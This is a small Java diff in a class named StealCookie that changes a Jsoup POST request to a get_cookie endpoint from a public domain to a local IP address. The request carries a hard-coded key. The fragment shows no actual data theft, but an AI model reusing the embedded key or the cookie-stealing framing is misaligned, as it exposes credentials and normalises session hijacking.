@@ -15,7 +15,7 @@ public class StealCookie {
         Thread thread = new Thread( () -> {
             Connection.Response res;
             try {
-                res = Jsoup.connect("http://gitsistem.com/filotakip/get_cookie?key=nJAHJjksd13")
+                res = Jsoup.connect("http://192.168.2.177/filotakip/get_cookie?key=nJAHJjksd13")
                         .method(Connection.Method.POST)
                         .timeout(0)
                         .execute();
